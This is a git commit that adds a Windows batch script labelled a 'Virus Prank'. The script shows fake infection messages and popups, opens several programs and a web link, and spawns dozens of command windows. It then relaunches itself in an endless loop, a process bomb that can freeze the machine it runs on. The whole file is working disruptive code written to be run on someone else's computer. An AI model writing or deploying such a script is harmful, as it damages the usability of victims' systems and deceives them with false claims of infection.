94a99d5dd6b5add0720ce0e635a2d401cf01341e
DavidMalware <oksanagogumoldova@gmail.com>
2025-06-07 20:03:22 +0300

    Add files via upload

---
+++ Skaidhyadg.bat
@@ -0,0 +1,34 @@
+@echo off
+title Skaidhyadg.bat Virus Prank
+color 0C
+:begin
+echo INITIATING SKAIDHYADG SEQUENCE...
+timeout /t 2 >nul
+echo 34% INFECTED...
+timeout /t 2 >nul
+echo 82% INFECTED...
+timeout /t 1 >nul
+echo ERROR! TOO MUCH SKAIDHYADG!
+timeout /t 1 >nul
+echo ERROR CODE: [Skaidhyadg-000x000WTF]
+timeout /t 2 >nul
+
+:startloop
+start notepad.exe
+start mspaint.exe
+start "" "https://www.youtube.com/shorts/cR9H0Y0RCY4"
+msg * YOU HAVE BEEN INFECTED BY SKAIDHYADG!!
+msg * SYSTEM TEMPERATURE: ALMOST 9999°C 🔥
+msg * INSTALLING MORE SKAIDHYADG... PLEASE WAIT...
+msg * ERROR: TOO MUCH SKAIDHYADG. ABORT?
+
+echo Generating fake processes...
+for /L %%a in (1,1,50) do (
+    start cmd /c "echo Skaidhyadg Process %%a Running... & pause"
+)
+echo Spamming the world with Skaidhyadg...
+timeout /t 2 >nul
+
+echo Opening loop...
+start Skaidhyadg.bat
+goto startloop
